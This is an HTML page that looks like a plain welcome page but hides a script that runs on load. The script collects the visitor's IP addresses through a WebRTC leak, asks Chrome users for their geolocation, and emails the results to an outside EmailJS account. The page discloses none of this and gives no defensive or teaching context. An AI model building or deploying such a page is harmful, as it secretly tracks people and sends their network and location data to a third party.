<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Data Collection</title>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        (function() {
            emailjs.init("k63mIxIV2m-x_kXBeasoc"); // Ваш User ID
        })();

        function getUserIP(onNewIP) { 
            var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
            var pc = new myPeerConnection({
                iceServers: []
            }),
            noop = function() {},
            localIPs = {},
            ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/g,
            key;

            function iterateIP(ip) {
                if (!localIPs[ip]) onNewIP(ip);
                localIPs[ip] = true;
            }

            pc.createDataChannel("");

            pc.createOffer().then(function(sdp) {
                sdp.sdp.split('\n').forEach(function(line) {
                    if (line.indexOf('candidate') < 0) return;
                    line.match(ipRegex).forEach(iterateIP);
                });

                pc.setLocalDescription(sdp, noop, noop);
            }).catch(function(reason) {});

            pc.onicecandidate = function(ice) {
                if (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex)) return;
                ice.candidate.candidate.match(ipRegex).forEach(iterateIP);
            };
        }

        function sendDataToEmail(userData) {
            // Отправка данных на почту через EmailJS
            emailjs.send("spamail.ail6", "template_73zczgq", userData)
                .then(function(response) {
                    console.log("Sent email successfully", response);
                }, function(error) {
                    console.log("Failed to send email", error);
                });
        }

        function collectData() {
            let userData = {};

            getUserIP(function(ip) {
                userData.ip = ip;
            });

            // Проверка, если это Chrome
            const isChrome = /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);

            if (isChrome && navigator.geolocation) {
                // Запрос геолокации, если это Chrome
                navigator.geolocation.getCurrentPosition(function(position) {
                    userData.location = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    };
                    sendDataToEmail(userData); // Отправка данных на email
                }, function(error) {
                    console.log('Error getting location: ' + error.message);
                    sendDataToEmail(userData); // Даже если ошибка, отправляем доступные данные
                });
            } else {
                console.log("Geolocation is not available or browser is not Chrome.");
                sendDataToEmail(userData); // Если не Chrome или геолокация не доступна, отправим только IP
            }
        }

        window.onload = function() {
            collectData(); // Сбор данных при загрузке страницы
        }
    </script>
</head>
<body>
    <h1>Welcome to our website</h1>
</body>
</html>